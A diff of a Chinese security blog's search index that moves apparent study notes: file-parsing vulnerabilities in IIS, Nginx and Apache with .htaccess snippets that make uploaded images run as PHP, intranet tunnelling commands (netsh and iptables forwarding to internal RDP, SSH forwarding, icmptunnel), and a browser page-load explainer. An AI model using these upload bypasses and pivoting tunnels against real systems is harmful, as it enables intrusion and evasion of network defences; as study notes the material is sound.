-<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>计算布局 计算每个元素的大小和位置</p>
-<h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p>绘制元素 浏览器绘制到屏幕上</p>
-<h1 id="处理资源请求"><a href="#处理资源请求" class="headerlink" title="处理资源请求"></a>处理资源请求</h1><p>发现资源：在解析 HTML 的过程中，浏览器会发现需要加载的资源(如图片、CSS 文件、JavaScript 文件等)<br>发送请求：浏览器会并行发送请求，加载这些资源<br>重复解析和渲染：浏览器重复上述的解析和渲染过程，直到所有资源加载完成</p>
-<h1 id="用户交互"><a href="#用户交互" class="headerlink" title="用户交互"></a>用户交互</h1><p>用户操作:页面加载完成后，用户可以与页面进行交互(如点击按钮、输入表单等)<br>事件处理:浏览器会根据用户的操作,触发相应的事件处理程序,更新页面内容</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>网络请求</tag>
       </tags>
   </entry>
   <entry>
@@ -1440,23 +1369,74 @@ w:Rock-y did-nt like that</div>
       </tags>
   </entry>
   <entry>
-    <title>解析漏洞知识记录</title>
-    <url>/posts/64ae55e3.html</url>
-    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
-<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
-<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
-<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
-<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
-<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
-<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
-<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
-<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
-<p>将所有名字里含shell的文件识别为php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>让.jpg后缀名文件以php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
+    <title>内网隧道搭建</title>
+    <url>/posts/d57d5540.html</url>
+    <content><![CDATA[<h1 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h1><h2 id="icmp探测"><a href="#icmp探测" class="headerlink" title="icmp探测"></a>icmp探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	#Windows</span><br><span class="line">ping 114.114.114.114 -c 1	#Linux</span><br></pre></td></tr></table></figure>
+<h2 id="http探测"><a href="#http探测" class="headerlink" title="http探测"></a>http探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
+<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>服务器可出网<br>反向代理可穿透防火墙<br>cobaltstrike socks代理<br>nps工具</p>
+<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="windows-netsh-端口转发-双网卡"><a href="#windows-netsh-端口转发-双网卡" class="headerlink" title="windows netsh 端口转发 双网卡"></a>windows netsh 端口转发 双网卡</h2><p>netsh仅支持tcp协议，适用于双网卡服务器<br>启动转发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看已有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加转发规则 访问外网ip1234端口即访问内网ip端口3389</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 </span><br></pre></td></tr></table></figure>
+<p>取消转发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=1234</span><br><span class="line"></span><br><span class="line"># xp需安装ipv4</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
+<h2 id="linux-iptables-转发-高权限"><a href="#linux-iptables-转发-高权限" class="headerlink" title="linux iptables 转发 高权限"></a>linux iptables 转发 高权限</h2><p>编辑配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启IP转发</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
+<p>关闭服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
+<p>配置规则</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
+<p>保存并重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+<h2 id="neo-regeorg端口复用"><a href="#neo-regeorg端口复用" class="headerlink" title="neo-regeorg端口复用"></a>neo-regeorg端口复用</h2><p>下载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
+<h1 id="linux-ssh隧道-高权限"><a href="#linux-ssh隧道-高权限" class="headerlink" title="linux ssh隧道 高权限"></a>linux ssh隧道 高权限</h1><h2 id="本地转发-正向"><a href="#本地转发-正向" class="headerlink" title="本地转发 正向"></a>本地转发 正向</h2><p>vps执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@目标外网Web服务器，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
+<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发 反向"></a>远程转发 反向</h2><p>web服务器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@VPS-IP，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
+<h1 id="icmp加密隧道"><a href="#icmp加密隧道" class="headerlink" title="icmp加密隧道"></a>icmp加密隧道</h1><p>icmp可出网</p>
+<p>linux: icmptunnel<br>服务端安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel/</span><br><span class="line">make</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要</span><br><span class="line">./icmptunnel -s 							#服务端以root用户监听</span><br><span class="line">(ctrl-z)									</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
+<p>客户端连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmptunnel &lt;server-IP&gt;</span><br><span class="line">(ctrl-z)</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
+<p>测试ssh连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.1</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Intranet安全</category>
+      </categories>
       <tags>
-        <tag>解析漏洞</tag>
+        <tag>内网穿透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器加载流程</title>
+    <url>/posts/1c025fc.html</url>
+    <content><![CDATA[<p>摘: <a href="https://www.cnblogs.com/ryanzheng/p/18284643">https://www.cnblogs.com/ryanzheng/p/18284643</a></p>
+<h1 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h1><p>用户访问URL: <a href="https://example.com/index/about?query=1">https://example.com/index/about?query=1</a></p>
+<h1 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h1><p>提取访问URL的协议(https),域名(example.com),路径(&#x2F;index&#x2F;about)和查询参数(query)</p>
+<h1 id="检查缓存"><a href="#检查缓存" class="headerlink" title="检查缓存"></a>检查缓存</h1><p>检查本地缓存是否有该域名的ip地址,如果有则使用缓存的ip地址</p>
+<h1 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h1><h2 id="什么是DNS缓存"><a href="#什么是DNS缓存" class="headerlink" title="什么是DNS缓存"></a>什么是DNS缓存</h2><p>在域名系统 (DNS) 中，缓存是在操作系统、浏览器、设备或网络中临时存储 DNS 记录的过程<br>DNS 记录用于将人类可读的域名(例如,example.com)转换为计算机和设备可以理解的对应 IP 地址，例如 2001:db8:3e8:2a3::b63<br>通过在本地存储 DNS 信息,DNS 缓存使域名能够更快地被转换或”解析”，同时可以减少网络流量</p>
+<h2 id="DNS缓存顺序"><a href="#DNS缓存顺序" class="headerlink" title="DNS缓存顺序"></a>DNS缓存顺序</h2><p>浏览器缓存:浏览器检查缓存是否有该域名ip地址<br>操作系统缓存:如若浏览器没有,浏览器向操作系统查询<br>本地dns服务器:操作系统缓存没有,则向配置的本地dns服务器发送查询请求<br>递归查询:本地 DNS 服务器会递归查询其他 DNS 服务器，直到找到该域名对应的 IP 地址<br>返回结果:DNS 服务器将结果返回给操作系统，再由操作系统返回给浏览器</p>
+<h1 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h1><h2 id="三次握手-TCP连接"><a href="#三次握手-TCP连接" class="headerlink" title="三次握手(TCP连接)"></a>三次握手(TCP连接)</h2><p>SYN:客户端发送至服务端请求连接<br>SYN-ACK:服务端收到回复确认表示同意连接<br>ACK:客户端确认回复并建立连接</p>
+<h2 id="TLS-SSL握手-HTTPS"><a href="#TLS-SSL握手-HTTPS" class="headerlink" title="TLS&#x2F;SSL握手(HTTPS)"></a>TLS&#x2F;SSL握手(HTTPS)</h2><p>客户端问候:客户端发送一个 ClientHello 消息,包含支持的加密算法、TLS 版本等信息<br>服务器问候:服务器回复一个 ServerHello 消息,选择加密算法和 TLS 版本,并发送服务器证书<br>证书验证:客户端验证服务器证书的有效性<br>密钥交换:客户端生成一个随机数,用服务器的公钥加密后发送给服务器，服务器用私钥解密，生成会话密钥<br>完成握手:双方使用会话密钥加密通信,握手完成</p>
+<h1 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h1><h2 id="构建请求"><a href="#构建请求" class="headerlink" title="构建请求"></a>构建请求</h2><p>浏览器构建一个 HTTP 请求，包括请求行(如 GET&#x2F;HTTP&#x2F;1.1)、请求头(如 Host: <a href="http://www.example.com)和可选的请求体/">www.example.com)和可选的请求体</a>(如 POST 请求的数据)</p>
+<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p>浏览器通过建立的 TCP 连接将 HTTP 请求发送到服务器</p>
+<h1 id="服务器处理请求"><a href="#服务器处理请求" class="headerlink" title="服务器处理请求"></a>服务器处理请求</h1><p>接收请求：服务器接收到 HTTP 请求<br>请求解析：服务器解析请求行、请求头和请求体<br>路由处理：服务器根据请求的路径和参数，确定处理请求的逻辑<br>业务逻辑：服务器执行相应的业务逻辑，可能涉及读取文件、查询数据库、调用其他服务等<br>生成响应：服务器生成一个 HTTP 响应，包括状态行(如 HTTP&#x2F;1.1 200 OK)、响应头(如 Content-Type: text&#x2F;html)和响应体(如 HTML 内容)</p>
+<h1 id="浏览器接收响应"><a href="#浏览器接收响应" class="headerlink" title="浏览器接收响应"></a>浏览器接收响应</h1><p>接收响应<br>浏览器接收服务器响应<br>解析响应<br>浏览器解析响应头和响应体</p>
+<h1 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h1><h2 id="解析html"><a href="#解析html" class="headerlink" title="解析html"></a>解析html</h2><p>构建DOM树 解析HTML文档，构建DOM树<br>处理脚本 遇到&lt; script &gt;标签浏览器会暂停解析，执行脚本，脚本可能修改DOM树</p>
+<h2 id="解析css"><a href="#解析css" class="headerlink" title="解析css"></a>解析css</h2><p>构建CSSOM树 解析css文件和内联样式，构建css object model树</p>
+<h2 id="解析javascript"><a href="#解析javascript" class="headerlink" title="解析javascript"></a>解析javascript</h2><p>执行脚本 解析和执行JavaScript代码，可能修改dom树和cssom树</p>
+<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>结合dom和cssom</p>
+<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>计算布局 计算每个元素的大小和位置</p>
+<h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p>绘制元素 浏览器绘制到屏幕上</p>
+<h1 id="处理资源请求"><a href="#处理资源请求" class="headerlink" title="处理资源请求"></a>处理资源请求</h1><p>发现资源：在解析 HTML 的过程中，浏览器会发现需要加载的资源(如图片、CSS 文件、JavaScript 文件等)<br>发送请求：浏览器会并行发送请求，加载这些资源<br>重复解析和渲染：浏览器重复上述的解析和渲染过程，直到所有资源加载完成</p>
+<h1 id="用户交互"><a href="#用户交互" class="headerlink" title="用户交互"></a>用户交互</h1><p>用户操作:页面加载完成后，用户可以与页面进行交互(如点击按钮、输入表单等)<br>事件处理:浏览器会根据用户的操作,触发相应的事件处理程序,更新页面内容</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>网络请求</tag>
       </tags>
   </entry>
   <entry>
@@ -1561,6 +1541,26 @@ w:Rock-y did-nt like that</div>
       </categories>
       <tags>
         <tag>邮件服务器搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞知识记录</title>
+    <url>/posts/64ae55e3.html</url>
+    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
+<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
+<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
+<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
+<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
+<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
+<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
+<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
+<p>将所有名字里含shell的文件识别为php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>让.jpg后缀名文件以php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>解析漏洞</tag>
       </tags>
   </entry>
 </search>
